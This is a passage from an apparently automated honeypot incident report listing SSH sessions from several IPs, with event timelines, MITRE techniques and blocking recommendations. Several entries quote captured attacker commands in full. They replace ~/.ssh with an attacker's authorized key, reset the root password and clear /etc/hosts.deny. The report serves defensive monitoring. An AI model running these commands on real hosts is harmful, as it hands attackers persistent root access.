- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d9bd5047dd1

| Field | Detail |
|---|---|
| **Source IP** | `45.202.240[.]36` |
| **First Seen** | 2026-06-03 23:26 |
| **Last Seen** | 2026-06-03 23:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:26:08` | `cowrie.session.connect` |
| `2026-06-03 23:26:08` | `cowrie.client.version` |
| `2026-06-03 23:26:09` | `cowrie.client.kex` |
| `2026-06-03 23:26:10` | `cowrie.login.success` |
| `2026-06-03 23:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.202.240[.]36` to AbuseIPDB if not already reported
- [ ] Block `45.202.240[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4a0ca1928ac

| Field | Detail |
|---|---|
| **Source IP** | `103.20.223[.]56` |
| **First Seen** | 2026-06-03 23:34 |
| **Last Seen** | 2026-06-03 23:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:34:02` | `cowrie.session.connect` |
| `2026-06-03 23:34:02` | `cowrie.client.version` |
| `2026-06-03 23:34:03` | `cowrie.client.kex` |
| `2026-06-03 23:34:04` | `cowrie.login.success` |
| `2026-06-03 23:34:04` | `cowrie.session.params` |
| `2026-06-03 23:34:04` | `cowrie.command.input` |
| `2026-06-03 23:34:04` | `cowrie.command.failed` |
| `2026-06-03 23:34:04` | `cowrie.log.closed` |
| `2026-06-03 23:34:05` | `cowrie.session.params` |
| `2026-06-03 23:34:05` | `cowrie.command.input` |
| `2026-06-03 23:34:05` | `cowrie.session.file_download` |
| `2026-06-03 23:34:05` | `cowrie.log.closed` |
| `2026-06-03 23:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.223[.]56` to AbuseIPDB if not already reported
- [ ] Block `103.20.223[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc4c35697bfb

| Field | Detail |
|---|---|
| **Source IP** | `103.20.223[.]56` |
| **First Seen** | 2026-06-03 23:34 |
| **Last Seen** | 2026-06-03 23:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:34:08` | `cowrie.session.connect` |
| `2026-06-03 23:34:08` | `cowrie.client.version` |
| `2026-06-03 23:34:08` | `cowrie.client.kex` |
| `2026-06-03 23:34:09` | `cowrie.login.success` |
| `2026-06-03 23:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.223[.]56` to AbuseIPDB if not already reported
- [ ] Block `103.20.223[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de8fc3a91e61

| Field | Detail |
|---|---|
| **Source IP** | `14.103.107[.]214` |
| **First Seen** | 2026-06-03 23:34 |
| **Last Seen** | 2026-06-03 23:34 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:otLYzwM7We0Z"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:34:18` | `cowrie.session.connect` |
| `2026-06-03 23:34:18` | `cowrie.client.version` |
| `2026-06-03 23:34:18` | `cowrie.client.kex` |
| `2026-06-03 23:34:18` | `cowrie.login.success` |
| `2026-06-03 23:34:19` | `cowrie.session.params` |
| `2026-06-03 23:34:19` | `cowrie.command.input` |
| `2026-06-03 23:34:19` | `cowrie.command.failed` |
| `2026-06-03 23:34:19` | `cowrie.log.closed` |
| `2026-06-03 23:34:19` | `cowrie.session.params` |
| `2026-06-03 23:34:19` | `cowrie.command.input` |
| `2026-06-03 23:34:20` | `cowrie.session.file_download` |
| `2026-06-03 23:34:20` | `cowrie.log.closed` |
| `2026-06-03 23:34:32` | `cowrie.session.params` |
| `2026-06-03 23:34:32` | `cowrie.command.input` |
| `2026-06-03 23:34:32` | `cowrie.log.closed` |
| `2026-06-03 23:34:32` | `cowrie.session.params` |
| `2026-06-03 23:34:32` | `cowrie.command.input` |
| `2026-06-03 23:34:33` | `cowrie.log.closed` |
| `2026-06-03 23:34:33` | `cowrie.session.params` |
| `2026-06-03 23:34:33` | `cowrie.command.input` |
| `2026-06-03 23:34:33` | `cowrie.session.file_download` |
| `2026-06-03 23:34:33` | `cowrie.log.closed` |
| `2026-06-03 23:34:33` | `cowrie.session.params` |
| `2026-06-03 23:34:33` | `cowrie.command.input` |
| `2026-06-03 23:34:33` | `cowrie.log.closed` |
| `2026-06-03 23:34:34` | `cowrie.session.params` |
| `2026-06-03 23:34:34` | `cowrie.command.input` |
| `2026-06-03 23:34:34` | `cowrie.log.closed` |
| `2026-06-03 23:34:34` | `cowrie.session.params` |
| `2026-06-03 23:34:34` | `cowrie.command.input` |
| `2026-06-03 23:34:34` | `cowrie.command.input` |
| `2026-06-03 23:34:34` | `cowrie.log.closed` |
| `2026-06-03 23:34:35` | `cowrie.session.params` |
| `2026-06-03 23:34:35` | `cowrie.command.input` |
| `2026-06-03 23:34:35` | `cowrie.log.closed` |
| `2026-06-03 23:34:35` | `cowrie.session.params` |
| `2026-06-03 23:34:35` | `cowrie.command.input` |
| `2026-06-03 23:34:35` | `cowrie.log.closed` |
| `2026-06-03 23:34:36` | `cowrie.session.params` |
| `2026-06-03 23:34:36` | `cowrie.command.input` |
| `2026-06-03 23:34:36` | `cowrie.log.closed` |
| `2026-06-03 23:34:36` | `cowrie.session.params` |
| `2026-06-03 23:34:36` | `cowrie.command.input` |
| `2026-06-03 23:34:36` | `cowrie.log.closed` |
| `2026-06-03 23:34:36` | `cowrie.session.params` |
| `2026-06-03 23:34:36` | `cowrie.command.input` |
| `2026-06-03 23:34:37` | `cowrie.log.closed` |
| `2026-06-03 23:34:37` | `cowrie.session.params` |
| `2026-06-03 23:34:37` | `cowrie.command.input` |
| `2026-06-03 23:34:37` | `cowrie.log.closed` |
| `2026-06-03 23:34:37` | `cowrie.session.params` |
| `2026-06-03 23:34:37` | `cowrie.command.input` |
| `2026-06-03 23:34:37` | `cowrie.log.closed` |
| `2026-06-03 23:34:38` | `cowrie.session.params` |
| `2026-06-03 23:34:38` | `cowrie.command.input` |
| `2026-06-03 23:34:38` | `cowrie.log.closed` |
| `2026-06-03 23:34:38` | `cowrie.session.params` |
| `2026-06-03 23:34:38` | `cowrie.command.input` |
| `2026-06-03 23:34:38` | `cowrie.log.closed` |
| `2026-06-03 23:34:39` | `cowrie.session.params` |
| `2026-06-03 23:34:39` | `cowrie.command.input` |
| `2026-06-03 23:34:39` | `cowrie.log.closed` |
| `2026-06-03 23:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.107[.]214` to AbuseIPDB if not already reported
- [ ] Block `14.103.107[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-757fe2824ae8

| Field | Detail |
|---|---|
| **Source IP** | `4.213.160[.]153` |
| **First Seen** | 2026-06-03 23:35 |
| **Last Seen** | 2026-06-03 23:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:35:25` | `cowrie.session.connect` |
| `2026-06-03 23:35:25` | `cowrie.client.version` |
| `2026-06-03 23:35:25` | `cowrie.client.kex` |
| `2026-06-03 23:35:25` | `cowrie.login.success` |
| `2026-06-03 23:35:25` | `cowrie.session.params` |
| `2026-06-03 23:35:25` | `cowrie.command.input` |
| `2026-06-03 23:35:25` | `cowrie.command.failed` |
| `2026-06-03 23:35:25` | `cowrie.log.closed` |
| `2026-06-03 23:35:25` | `cowrie.session.params` |
| `2026-06-03 23:35:25` | `cowrie.command.input` |
| `2026-06-03 23:35:25` | `cowrie.session.file_download` |
| `2026-06-03 23:35:25` | `cowrie.log.closed` |
| `2026-06-03 23:35:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.213.160[.]153` to AbuseIPDB if not already reported
- [ ] Block `4.213.160[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e39bd0789aaf

| Field | Detail |
|---|---|
| **Source IP** | `4.213.160[.]153` |
| **First Seen** | 2026-06-03 23:35 |
| **Last Seen** | 2026-06-03 23:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:35:26` | `cowrie.session.connect` |
| `2026-06-03 23:35:26` | `cowrie.client.version` |
| `2026-06-03 23:35:26` | `cowrie.client.kex` |
| `2026-06-03 23:35:26` | `cowrie.login.success` |
| `2026-06-03 23:35:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.213.160[.]153` to AbuseIPDB if not already reported
- [ ] Block `4.213.160[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e7cc3faf087

| Field | Detail |
|---|---|
| **Source IP** | `14.103.107[.]214` |
| **First Seen** | 2026-06-03 23:36 |
| **Last Seen** | 2026-06-03 23:37 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Ir4Ntj9C5p9j"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:36:42` | `cowrie.session.connect` |
| `2026-06-03 23:36:42` | `cowrie.client.version` |
| `2026-06-03 23:36:43` | `cowrie.client.kex` |
| `2026-06-03 23:36:43` | `cowrie.login.success` |
| `2026-06-03 23:36:44` | `cowrie.session.params` |
| `2026-06-03 23:36:44` | `cowrie.command.input` |
| `2026-06-03 23:36:44` | `cowrie.command.failed` |
| `2026-06-03 23:36:44` | `cowrie.log.closed` |
| `2026-06-03 23:36:44` | `cowrie.session.params` |
| `2026-06-03 23:36:44` | `cowrie.command.input` |
| `2026-06-03 23:36:44` | `cowrie.session.file_download` |
| `2026-06-03 23:36:44` | `cowrie.log.closed` |
| `2026-06-03 23:36:57` | `cowrie.session.params` |
| `2026-06-03 23:36:57` | `cowrie.command.input` |
| `2026-06-03 23:36:57` | `cowrie.log.closed` |
| `2026-06-03 23:36:57` | `cowrie.session.params` |
| `2026-06-03 23:36:57` | `cowrie.command.input` |
| `2026-06-03 23:36:57` | `cowrie.log.closed` |
| `2026-06-03 23:36:58` | `cowrie.session.params` |
| `2026-06-03 23:36:58` | `cowrie.command.input` |
| `2026-06-03 23:36:58` | `cowrie.session.file_download` |
| `2026-06-03 23:36:58` | `cowrie.log.closed` |
| `2026-06-03 23:36:58` | `cowrie.session.params` |
| `2026-06-03 23:36:58` | `cowrie.command.input` |
| `2026-06-03 23:36:58` | `cowrie.log.closed` |
| `2026-06-03 23:36:58` | `cowrie.session.params` |
| `2026-06-03 23:36:58` | `cowrie.command.input` |
| `2026-06-03 23:36:59` | `cowrie.log.closed` |
| `2026-06-03 23:36:59` | `cowrie.session.params` |
| `2026-06-03 23:36:59` | `cowrie.command.input` |
| `2026-06-03 23:36:59` | `cowrie.command.input` |
| `2026-06-03 23:36:59` | `cowrie.log.closed` |
| `2026-06-03 23:36:59` | `cowrie.session.params` |
| `2026-06-03 23:36:59` | `cowrie.command.input` |
| `2026-06-03 23:36:59` | `cowrie.log.closed` |
| `2026-06-03 23:37:00` | `cowrie.session.params` |
| `2026-06-03 23:37:00` | `cowrie.command.input` |
| `2026-06-03 23:37:00` | `cowrie.log.closed` |
| `2026-06-03 23:37:00` | `cowrie.session.params` |
| `2026-06-03 23:37:00` | `cowrie.command.input` |
| `2026-06-03 23:37:00` | `cowrie.log.closed` |
| `2026-06-03 23:37:01` | `cowrie.session.params` |
| `2026-06-03 23:37:01` | `cowrie.command.input` |
| `2026-06-03 23:37:01` | `cowrie.log.closed` |
| `2026-06-03 23:37:01` | `cowrie.session.params` |
| `2026-06-03 23:37:01` | `cowrie.command.input` |
| `2026-06-03 23:37:01` | `cowrie.log.closed` |
| `2026-06-03 23:37:02` | `cowrie.session.params` |
| `2026-06-03 23:37:02` | `cowrie.command.input` |
| `2026-06-03 23:37:02` | `cowrie.log.closed` |
| `2026-06-03 23:37:02` | `cowrie.session.params` |
| `2026-06-03 23:37:02` | `cowrie.command.input` |
| `2026-06-03 23:37:02` | `cowrie.log.closed` |
| `2026-06-03 23:37:03` | `cowrie.session.params` |
| `2026-06-03 23:37:03` | `cowrie.command.input` |
| `2026-06-03 23:37:03` | `cowrie.log.closed` |
| `2026-06-03 23:37:03` | `cowrie.session.params` |
| `2026-06-03 23:37:03` | `cowrie.command.input` |
| `2026-06-03 23:37:03` | `cowrie.log.closed` |
| `2026-06-03 23:37:04` | `cowrie.session.params` |
| `2026-06-03 23:37:04` | `cowrie.command.input` |
| `2026-06-03 23:37:04` | `cowrie.log.closed` |
| `2026-06-03 23:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.107[.]214` to AbuseIPDB if not already reported
- [ ] Block `14.103.107[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63c25738ea2e

| Field | Detail |
|---|---|
| **Source IP** | `103.20.223[.]56` |
| **First Seen** | 2026-06-03 23:38 |
| **Last Seen** | 2026-06-03 23:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:38:38` | `cowrie.session.connect` |
| `2026-06-03 23:38:38` | `cowrie.client.version` |
| `2026-06-03 23:38:38` | `cowrie.client.kex` |
| `2026-06-03 23:38:39` | `cowrie.login.success` |
| `2026-06-03 23:38:40` | `cowrie.session.params` |
| `2026-06-03 23:38:40` | `cowrie.command.input` |
| `2026-06-03 23:38:40` | `cowrie.command.failed` |
| `2026-06-03 23:38:40` | `cowrie.log.closed` |
| `2026-06-03 23:38:40` | `cowrie.session.params` |
| `2026-06-03 23:38:40` | `cowrie.command.input` |
| `2026-06-03 23:38:41` | `cowrie.session.file_download` |
| `2026-06-03 23:38:41` | `cowrie.log.closed` |
| `2026-06-03 23:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.223[.]56` to AbuseIPDB if not already reported
- [ ] Block `103.20.223[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c642ba8571a3

| Field | Detail |
|---|---|
| **Source IP** | `103.20.223[.]56` |
| **First Seen** | 2026-06-03 23:38 |
| **Last Seen** | 2026-06-03 23:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:38:43` | `cowrie.session.connect` |
| `2026-06-03 23:38:43` | `cowrie.client.version` |
| `2026-06-03 23:38:44` | `cowrie.client.kex` |
| `2026-06-03 23:38:44` | `cowrie.login.success` |
| `2026-06-03 23:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.223[.]56` to AbuseIPDB if not already reported
- [ ] Block `103.20.223[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66b8ae3b9413

| Field | Detail |
|---|---|
| **Source IP** | `200.105.172[.]184` |
| **First Seen** | 2026-06-03 23:42 |
| **Last Seen** | 2026-06-03 23:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:42:13` | `cowrie.session.connect` |
| `2026-06-03 23:42:13` | `cowrie.client.version` |
| `2026-06-03 23:42:13` | `cowrie.client.kex` |
| `2026-06-03 23:42:15` | `cowrie.login.success` |
| `2026-06-03 23:42:15` | `cowrie.session.params` |
| `2026-06-03 23:42:15` | `cowrie.command.input` |
| `2026-06-03 23:42:15` | `cowrie.command.failed` |
| `2026-06-03 23:42:16` | `cowrie.log.closed` |
| `2026-06-03 23:42:16` | `cowrie.session.params` |
| `2026-06-03 23:42:16` | `cowrie.command.input` |
| `2026-06-03 23:42:17` | `cowrie.session.file_download` |
| `2026-06-03 23:42:17` | `cowrie.log.closed` |
| `2026-06-03 23:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.172[.]184` to AbuseIPDB if not already reported
- [ ] Block `200.105.172[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-755502ed6b06

| Field | Detail |
|---|---|
| **Source IP** | `200.105.172[.]184` |
| **First Seen** | 2026-06-03 23:42 |
| **Last Seen** | 2026-06-03 23:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:42:20` | `cowrie.session.connect` |
| `2026-06-03 23:42:20` | `cowrie.client.version` |
| `2026-06-03 23:42:21` | `cowrie.client.kex` |
| `2026-06-03 23:42:22` | `cowrie.login.success` |
| `2026-06-03 23:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.172[.]184` to AbuseIPDB if not already reported
- [ ] Block `200.105.172[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f43a2aa8d2e6

| Field | Detail |
|---|---|
| **Source IP** | `4.213.160[.]153` |
| **First Seen** | 2026-06-03 23:43 |
| **Last Seen** | 2026-06-03 23:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:43:47` | `cowrie.session.connect` |
| `2026-06-03 23:43:47` | `cowrie.client.version` |
| `2026-06-03 23:43:47` | `cowrie.client.kex` |
| `2026-06-03 23:43:47` | `cowrie.login.success` |
| `2026-06-03 23:43:47` | `cowrie.session.params` |
| `2026-06-03 23:43:47` | `cowrie.command.input` |
| `2026-06-03 23:43:47` | `cowrie.command.failed` |
| `2026-06-03 23:43:47` | `cowrie.log.closed` |
| `2026-06-03 23:43:47` | `cowrie.session.params` |
| `2026-06-03 23:43:47` | `cowrie.command.input` |
| `2026-06-03 23:43:47` | `cowrie.session.file_download` |
| `2026-06-03 23:43:47` | `cowrie.log.closed` |
| `2026-06-03 23:43:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.213.160[.]153` to AbuseIPDB if not already reported
- [ ] Block `4.213.160[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ece6faccd2c

| Field | Detail |
|---|---|
| **Source IP** | `4.213.160[.]153` |
| **First Seen** | 2026-06-03 23:43 |
| **Last Seen** | 2026-06-03 23:43 |
| **Session Duration** | 0s |
